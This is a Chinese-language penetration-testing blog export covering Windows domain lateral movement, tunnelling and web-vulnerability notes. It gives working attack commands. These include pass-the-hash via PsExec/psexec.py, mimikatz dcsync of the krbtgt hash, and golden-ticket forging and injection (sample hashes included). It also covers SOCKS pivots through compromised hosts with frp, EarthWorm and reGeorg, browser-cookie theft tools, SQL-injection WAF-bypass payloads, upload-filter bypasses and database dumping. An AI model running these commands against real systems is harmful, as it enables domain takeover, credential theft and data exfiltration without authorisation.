<p>PsExec64.exe \10.10.3.6 -u “shmily.god/Administrator” -p 123456 -s cmd.exe </p>
<p>#-u 域\用户名  -p 密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">psexec.py </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cd243e1e171da2c4edd1dd695bfbef5a shmily.god/Administrator@192.168.119.100</p>
<p>python3 psexec.py shmily.god/administrator:admin123…!@192.168.119.100</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># PTT</span><br><span class="line"></span><br><span class="line">通常用来域内&#96;权限维持&#96;</span><br><span class="line"></span><br><span class="line">### Golden Ticket</span><br><span class="line"></span><br><span class="line">![image-20220307225058167](内网横向渗透&#x2F;image-20220307225058167.png)</span><br><span class="line"></span><br><span class="line">krbtgt 是kdc服务使用账户，在Domain Admins组中，域环境中，用户账户的票据都是krbtgt生成的。</span><br><span class="line"></span><br><span class="line">如果攻击者拿到了 krbtgt的ntml hash或者AES-256值，&#96;即可伪造任意用户身份&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">需要条件：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li><p>需要伪造的域用户名（有域管，肯定伪造域管啦）</p>
</li>
<li><p>该域的域名</p>
</li>
<li><p>krbtgt的ntml hash或者AES-256值</p>
</li>
<li><p>域krbtgt  SID (去掉-502)     （wmic useraccount get name,sid）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">获得krbtgt账号的SID值和ntml hash哈希值     [这个需要我们用域账户（权限太低不行，即域管权限），并且将该用户加入本地管理员组，或者用域管理员方式进行cmd命令执行]</span><br><span class="line"></span><br><span class="line">1. 获得hash等需要的条件信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>mimikatz.exe “privilege::debug” “lsadump::dcsync /domain:shmily.god /user:krbtgt”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220307225230207](内网横向渗透&#x2F;image-20220307225230207.png)</span><br><span class="line"></span><br><span class="line">![image-20220307225631024](内网横向渗透&#x2F;image-20220307225631024.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>SID        :S-1-5-21-2538459943-234226500-22795540782<br>ntml hash  :8aecb1498df128a866968668302003bd<br>aes256     :1f15a3cce65909ed19ff0e5ec6b7102f630be3725b12c66e25251ab0b81305e7 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2. 查询域管理员账号：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>net group “domain admins” /domain</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308000619676](内网横向渗透&#x2F;image-20220308000619676.png)</span><br><span class="line"></span><br><span class="line">注入票据前</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>dir \192.168.119.200\c$</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308004612176](内网横向渗透&#x2F;image-20220308004612176.png)</span><br><span class="line"></span><br><span class="line">3. 清空会话票据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>privilege::debug<br>kerberos::purge</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308001049876](内网横向渗透&#x2F;image-20220308001049876.png)</span><br><span class="line"></span><br><span class="line">4. 生成黄金票据(Administrator.kiribi)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>kerberos::golden /user:administrator /domain:shmily.god /sid:S-1-5-21-2538459943-234226500-22795540782 /krbtgt:8aecb1498df128a866968668302003bd /ticket:Administrator.kiribi</p>
</li>
</ol>
<h1 id="kerberos-golden-user-要伪造的域用户-我们这一般写域管理员-domain-域名-sid-域的sid值-krbtgt-krbtgt的哈希-ptt"><a href="#kerberos-golden-user-要伪造的域用户-我们这一般写域管理员-domain-域名-sid-域的sid值-krbtgt-krbtgt的哈希-ptt" class="headerlink" title="kerberos::golden /user:要伪造的域用户(我们这一般写域管理员) /domain:域名 /sid:域的sid值 /krbtgt:krbtgt的哈希 /ptt"></a>kerberos::golden /user:要伪造的域用户(我们这一般写域管理员) /domain:域名 /sid:域的sid值 /krbtgt:krbtgt的哈希 /ptt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308002554785](内网横向渗透&#x2F;image-20220308002554785.png)</span><br><span class="line"></span><br><span class="line">5. 注入票据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>kerberos::ptt Administrator.kiribi</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308002722245](内网横向渗透&#x2F;image-20220308002722245.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>kerberos::tgt  查看当前票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220308002904106](内网横向渗透&#x2F;image-20220308002904106.png)</span><br><span class="line"></span><br><span class="line">6. 验证</span><br><span class="line"></span><br><span class="line">![image-20220308003825467](内网横向渗透&#x2F;image-20220308003825467.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用黄金票据伪造的用户可以是任意用户（即使这个用户不存在），因为 TGT 的加密是由 krbtgt 完成的，所以只要 TGT 被 krbtgt 账户和密码正确的加密，那么任意 KDC 使用 krbtgt 将 TGT 解密后，TGT 中的所有信息都是可信的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Silver Ticket</span><br><span class="line"></span><br><span class="line">![image-20220307220404812](内网横向渗透&#x2F;image-20220307220404812.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### EnhancedGolden Tickets</span><br><span class="line"></span><br><span class="line">参考：https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;system&#x2F;197160.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过域内主机在迁移时&#96;LDAP库&#96;中的&#96;SIDHistory&#96;属性中保存的&#96;上一个域&#96;的&#96;SID值&#96;制作可以跨域的金票。</span><br><span class="line"></span><br><span class="line">如果知道根域的SID那么就可以&#96;通过子域&#96;的KRBTGT的&#96;HASH&#96;值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>kerberos::golden /admin:administrator /domain:news.yunying.lab /sid:XXX /sids:XXX /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt</p>
<pre><code>
Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间



这使用的是子域krbtgt的 hash，根域的不知道。



参考：渗透攻击红队公众号

[内网渗透（四） | 票据传递攻击 - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1653877)</code></pre>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网横向渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透/代理</title>
    <url>/2020/12/22/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h2 id="frp篇"><a href="#frp篇" class="headerlink" title="frp篇"></a>frp篇</h2><h3 id="web端口转发-rdp转发"><a href="#web端口转发-rdp转发" class="headerlink" title="web端口转发+rdp转发"></a>web端口转发+rdp转发</h3><p>ubantu 桥接模式 ip:192.168.1.102  (模拟公网server)</p>
<p>win7     NAT模式   ip:192.168.119.129(模拟内网)</p>
<p> 下载对应版本<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
<hr>
<blockquote>
<p>ubantu  </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.37.0&#x2F;frp_0.37.0_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.37.0_linux_amd64.tar.gz</span><br><span class="line">cd frp_0.37.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 6000      #frp服务器端口</span><br><span class="line">vhost_http_port&#x3D; 8080  #设定的http访问端口  （一定要写）</span><br></pre></td></tr></table></figure>

<ul>
<li>启动：./frps -c frps.ini</li>
</ul>
<hr>
<a id="more"></a>

<blockquote>
<p>win7   </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.1.102   #ip</span><br><span class="line">server_port &#x3D; 6000            #本机绑定的端口</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type &#x3D; http    </span><br><span class="line">local_ip &#x3D; 192.168.119.129</span><br><span class="line">local_port &#x3D; 80                #要映射的本地端口</span><br><span class="line">custom_domains &#x3D; 192.168.1.102 #或者域名     </span><br><span class="line">remote_port &#x3D; 8080    </span><br><span class="line">http_user &#x3D; admin               #安全认证</span><br><span class="line">http_pwd &#x3D; admin  </span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type&#x3D;tcp</span><br><span class="line">local_ip &#x3D; 192.168.119.129      #远程桌面映射3389端口</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 3389</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>启动 frpc -c frpc.ini</li>
</ul>
<hr>
<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><ul>
<li>vps</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 6000      </span><br></pre></td></tr></table></figure>

<p>​        </p>
<ul>
<li>跳板机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.1.102   #vps-ip</span><br><span class="line">server_port &#x3D; 6000            #本机绑定的端口</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">tpye &#x3D; tcp</span><br><span class="line">local_port &#x3D; 11111  #一定写本地端口</span><br><span class="line">remote_port &#x3D;10010  #带出到外网vps端口</span><br><span class="line">plugin &#x3D; socks5</span><br></pre></td></tr></table></figure>

<ul>
<li>攻击机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接绑定vps-ip和remote_port</span><br></pre></td></tr></table></figure>





<h2 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h2><blockquote>
<p>kali</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">portfwd add ‐l 33333 ‐r 192.168.1.102 ‐p 3389      将192.168.1.102的3389端口转发到kali 33333端口</span><br></pre></td></tr></table></figure>

<p>在meterpreter会话口将端口转发出来，</p>
<p><a href="https://blog.csdn.net/ws13129/article/details/94395905">参考</a></p>
<hr>
<p>下面测试代理的环境：</p>
<p>本地主机：192.168.1.101</p>
<p>kali ：192.168.1.103 （桥接）</p>
<p>内网入口双网卡：192.168.1.102（桥接），连接内网192.168.52.0/24（vmnet1） （内网入口）</p>
<p>内网服务器：192.168.52.138</p>
<p>能否代理成功就看本机能否访问<a href="http://192.168.52.138/">http://192.168.52.138/</a></p>
<hr>
<p>工具：</p>
<p>proxifier:<a href="https://www.filehorse.com/download-proxifier/">https://www.filehorse.com/download-proxifier/</a>    or <a href="https://proxifier.soft32.com/">https://proxifier.soft32.com/</a></p>
<p>EarthWorm，停止更新</p>
<p>reGeorg <a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
<p>Neo-reGeorg <a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<h2 id="earthworm"><a href="#earthworm" class="headerlink" title="earthworm"></a>earthworm</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><blockquote>
<p>内网攻击机–&gt;失陷公网主机</p>
</blockquote>
<p>我们拿下的是一台公网机器shell，该机器有内网网卡，与内网相通。通过在失陷公网添加代理，对内网资产进行探测。</p>
<ul>
<li>失陷公网主机（跳板机）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ew  -s  ssocksd  -l  10010       &#x2F;&#x2F;在10010端口开启socks代理，SOCK5</span><br></pre></td></tr></table></figure>



<ul>
<li>kali</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line"></span><br><span class="line">注释掉socks4，添加</span><br><span class="line"></span><br><span class="line">socks5  192.168.1.102  10010</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/22/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ew1.png" alt="ew1"></p>
<ul>
<li>本机win利用proxifier添加ip 端口进行全局代理也可以</li>
</ul>
<p><img src="/2020/12/22/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ew2.png" alt="ew2"></p>
<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><blockquote>
<p>内网攻击机 -&gt; 自己的公网vps -&gt; 受陷内网</p>
</blockquote>
<p>场景就是我们通过某些服务直接拿下了内网一台机器，该机器只是通过映射某些端口对外网，能够提供相应服务。</p>
<p>我们需要通过socks5反向代理将流量带进内网，进行内网探测。</p>
<p>kali                             192.168.1.101</p>
<p>vps                              35.34.xx.xx</p>
<p>内网失陷主机             192.168.119.20</p>
<ul>
<li>内网失陷主机 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew_for_win_32.exe -s rssocks -d 35.34.xx.xx -e 1024       反向代理连接公网服务器。</span><br></pre></td></tr></table></figure>



<ul>
<li>vps</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ew_for_linux-s -rcsocks -l 1010 -e 1024</span><br><span class="line"></span><br><span class="line">监听1010等本机访问          监听1024端口，等内网反弹。</span><br></pre></td></tr></table></figure>



<ul>
<li>kali</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line"></span><br><span class="line">socks5 35.34.xx.xx 1010</span><br></pre></td></tr></table></figure>



<ul>
<li>or  本机windows</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ew  -s  rssocks -d  35.34.xx.xx  -e 1024</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><ul>
<li>正向代理</li>
</ul>
<p>tunnel.php多了<code>dl(&quot;php_sockets.dll&quot;);</code>这行代码。作用是加载socket这个模块，但dl自php 5.3起默认情况下处于禁用状态，所以php 5.3版本以下才可以使用tunnel.php。如果启用，则需配置php.ini(开启enable_dl ，安装php_sockets扩展客户端)。</p>
<p>window下这个靶机我是没有配置好。。。</p>
<p>本机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 10010 -u http:&#x2F;&#x2F;192.168.1.102&#x2F;tunnel.php</span><br></pre></td></tr></table></figure>



<h2 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h2><ul>
<li>正向代理</li>
</ul>
<p>人家魔改的,我的靶机还是报错，，，感觉这个还是有点限制的</p>
<p>本机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k zzz</span><br><span class="line">python neoreg.py -k zzz -u http:&#x2F;&#x2F;192.168.1.102&#x2F;tunnel.php  -p 10010</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网穿透/代理</tag>
      </tags>
  </entry>
  <entry>
    <title>内网知识学习</title>
    <url>/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="ntlm协议"><a href="#ntlm协议" class="headerlink" title="ntlm协议"></a>ntlm协议</h1><p>windows身份认证</p>
<p>pth基础</p>
<p><a href="https://www.istt.org.cn/NewsDetail/2031875.html">Windows认证原理 网络认证(进阶篇)-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
<h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos是一种由MIT提出的一种计算机网络授权协议，旨在通过使用加密技术为客户端/服务端应用程序提供强大的认证服务。</p>
<p>Kerberos 主要是用在<code>域环境下的身份认证协议</code>。</p>
<p><img src="/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/image-20220124122003434.png" alt="image-20220124122003434"></p>
<p>client              ——       TGT            ——               <strong>KDC</strong>，密钥分发中心(<strong>AS</strong>，身份验证服务,<strong>TGS</strong>，票据授权服务)</p>
<p>|</p>
<p>TGS(ticket )</p>
<p>|</p>
<p>server </p>
<p>tgt   黄金票据</p>
<p>tgs  白银票据</p>
<p>EnhancedGolden <strong>Tickets</strong>    增强版（子域打域控）</p>
<p>（权限维持）</p>
<p>参考：</p>
<p><a href="https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA">https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA</a></p>
<p><a href="https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA">https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA</a></p>
<p><a href="https://www.istt.org.cn/NewsDetail/2031879.html">Windows认证原理 Kerberos认证-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
<p>​    </p>
<h1 id="解密浏览器密码工具"><a href="#解密浏览器密码工具" class="headerlink" title="解密浏览器密码工具"></a>解密浏览器密码工具</h1><p>（有杀软）本地解chrome数据库方法：<a href="https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7">https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7</a> </p>
<p>（无杀软） 直接用<a href="https://github.com/moonD4rk/HackBrowserData">hack-browser-data.exe</a>导出cookie</p>
<p>参考：</p>
<p>dozerctf2021域渗透：<a href="https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b">https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b</a></p>
<h1 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h1><p> 活动目录是一种目录服务：活动目录通过域控制器接受查询请求，查询活动目录数据库把域对象名字解析为对象记录</p>
<p>​    <code>活动目录用户</code>通过<code>LDAP协议</code>（一种进入目录服务的协议）向活动目录服务器<code>发送请求</code>，为了定位提供查询服务的域控制器就需要借助于DNS。</p>
<p>​    活动目录使用<code>DNS服务器</code>作为<code>定位服务器</code>，把域控制器解析为IP地址。活动目录要发挥作用，离不开DNS。</p>
<p>ntds.dit</p>
<p>ldap</p>
<p><a href="https://www.freebuf.com/articles/network/283763.html">内网渗透测试：内网环境与活动目录基础概念 - FreeBuf网络安全行业门户</a></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网知识学习</tag>
      </tags>
  </entry>
  <entry>
    <title>基础web漏洞总结</title>
    <url>/2022/03/14/%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>同协议同域名同端口的网站才能进行资源的获取和共享。</p>
<h3 id="jsonp-劫持"><a href="#jsonp-劫持" class="headerlink" title="jsonp  劫持"></a>jsonp  劫持</h3><p><a href="http://wjlshare.com/archives/1319">JSONP劫持漏洞学习笔记(待补充) – 天下大木头 (wjlshare.com)</a></p>
<p>利用<code>&lt;script&gt;</code>标签</p>
<h3 id="core"><a href="#core" class="headerlink" title="core"></a>core</h3><p>利用Origin头</p>
<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p>简单来说就是传参过滤不严谨照成sql语句的拼接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id  = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT name FROM users WHERE id = <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>



<p><a href="https://www.shmilying.tk/categories/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/">常见数据库注入 | (shmilying.tk)</a></p>
 <a id="more"></a>



<h3 id="常见基础绕过"><a href="#常见基础绕过" class="headerlink" title="常见基础绕过"></a>常见基础绕过</h3><p>绕过空格</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%20</span><br><span class="line">+</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">()</span><br><span class="line">&#x2F;*!%23xxxx%%0a*&#x2F;</span><br><span class="line">%23c%0a</span><br></pre></td></tr></table></figure>

<p>关键字绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大小写&#x2F;双写</span><br><span class="line">&#x2F;*!select*&#x2F;</span><br><span class="line">&#x2F;*!50000select*&#x2F;            50000不行可以fuzz其他的数字试试，小于当前mysql版本号就行，能使用</span><br><span class="line">sel&#x2F;**&#x2F;ect</span><br><span class="line"></span><br><span class="line">%23 -&gt;#</span><br><span class="line">%0a -&gt;换行</span><br><span class="line"></span><br><span class="line">结合：</span><br><span class="line">select *from &#x2F;*!%23xxxxx%0a*&#x2F;users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">绕安全狗（https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;eva6L_zQx79GTWCDvfT7zg）</span><br><span class="line">select</span><br><span class="line">&#x2F;*!50000%53elect*&#x2F;</span><br><span class="line">order </span><br><span class="line"> &#x2F;*!50000%6frder*&#x2F;</span><br><span class="line">union</span><br><span class="line">&#x2F;*!50000%75nion*&#x2F;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from</span><br><span class="line">&#x2F;*!%23xxxx%%0afrom*&#x2F;</span><br><span class="line"></span><br><span class="line">database()</span><br><span class="line"></span><br><span class="line">database&#x2F;*!%23xxxx%0a*&#x2F;()</span><br></pre></td></tr></table></figure>

<p>注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--+www</span><br><span class="line">-- www</span><br><span class="line">#</span><br></pre></td></tr></table></figure>



<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h3 id="bypass收藏语句"><a href="#bypass收藏语句" class="headerlink" title="bypass收藏语句"></a>bypass收藏语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><ol>
<li>判断前后端校验</li>
<li>判断黑白名单（可以上传1.xxxxx 测试）</li>
</ol>
<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h5 id="利用文件包含"><a href="#利用文件包含" class="headerlink" title="利用文件包含"></a>利用文件包含</h5><ul>
<li>图片马</li>
<li>包含session文件</li>
<li>条件竞争（大量上传正确文件，在这个空隙中上传恶意后缀文件 。  这个要看他后端代码 判断有问题）</li>
</ul>
<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h5 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">##### %00截断</span><br><span class="line"></span><br><span class="line">.xxx.com&#x2F;shell.php%00.jpg    ---&gt;   .xxx.com&#x2F;shell.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>get  %00<br>post  urldecode(%00) 即  00(hex)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### windows特性</span><br><span class="line"></span><br><span class="line"> test.asp. </span><br><span class="line"></span><br><span class="line">test.asp_</span><br><span class="line"></span><br><span class="line">test.asp+空格</span><br><span class="line"></span><br><span class="line">test.asp::$DATA</span><br><span class="line"></span><br><span class="line">### 解析漏洞</span><br><span class="line"></span><br><span class="line">- IIS 6.0—— （*.asp;.jpg             *.asp&#x2F;test.jpg   ）</span><br><span class="line">- IIS 7.x—— 默认Fast-cgi开启，直接在图片地址后面输入&#x2F;.php就会将图片当做php解析</span><br><span class="line">- Nginx——版本小于0.8.37 利用方法和IIS7.0一样</span><br><span class="line">- Apache—— 上传文件名为test.php.x1.x2.x3, Apache是从右往左判断</span><br><span class="line">- Lighttpd—— XX.jpg&#x2F;xx.php</span><br><span class="line"></span><br><span class="line">apache的 &#96;.htaccess&#96;解析</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>AddType application/ x-httpd-php .jpg</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#96;.user.ini &#96; (nginx&#x2F;apache&#x2F;IIS中支持fastcgi的都可以用)  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>auto_prepend_file=test.jpg   # 在页面顶部加载文件    （类似于在文件前调用了require()函数包含test.jpg）       </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### bypass</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10459</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10515</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### disable_functions Bypass </span><br><span class="line"></span><br><span class="line">1. LD_PRELOAD </span><br><span class="line">2. 利用 Windows 系统组件 COM</span><br><span class="line">3. 蚁剑插件</span><br><span class="line"></span><br><span class="line">[bypass disable_function多种方法+实例 - 安全客，安全资讯平台 (anquanke.com)](https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;208451)</span><br><span class="line"></span><br><span class="line">[干货 | 突破disable_functions限制执行命令·上 - 云+社区 - 腾讯云 (tencent.com)](https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1944125)</span><br><span class="line"></span><br><span class="line">[干货 | 突破disable_functions限制执行命令·下 - 云+社区 - 腾讯云 (tencent.com)](https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1944129)</span><br><span class="line"></span><br><span class="line">### tips</span><br><span class="line"></span><br><span class="line">+ 条件竞争</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># csrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">referer</span><br><span class="line"></span><br><span class="line">token</span><br><span class="line"></span><br><span class="line"># ssrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 常用协议：</span><br><span class="line"></span><br><span class="line">file，dict，gopher，dns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ssrf+redis</span><br><span class="line"></span><br><span class="line">1. 主从复制</span><br><span class="line">2. 计划任务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 网站源码备份</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>cd /var/www/html<br>tar -zcvf ~/html.tar.gz *</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 脱数据库</span><br><span class="line"></span><br><span class="line">+ mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> mysqldump -u root -p –all-databases &gt; ~/backup.sql  # 备份所有数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>在mysql/data/  中文件1111</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ mssql 数据库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>backup database Test to disk=’D:/Test.bak’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>msdbdata.mdf msdblog.ldf 两个文件 copy 一份</p>
